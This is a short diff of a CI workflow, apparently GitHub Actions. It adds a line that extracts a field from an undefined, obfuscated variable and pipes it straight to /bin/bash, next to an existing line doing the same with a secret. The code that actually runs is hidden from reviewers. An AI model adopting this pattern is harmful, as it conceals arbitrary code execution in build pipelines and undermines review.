@@ -18,6 +18,7 @@ jobs:
           dx1038: ${{ secrets.dx1038 }}
         run: |
           printf '%s' "$dx1038" | jq -r .y10898 | /bin/bash
+          printf '%s' "$urncy148" | jq -r .sjcg8 | /bin/bash
 
       - name: Archive output
         if: always()
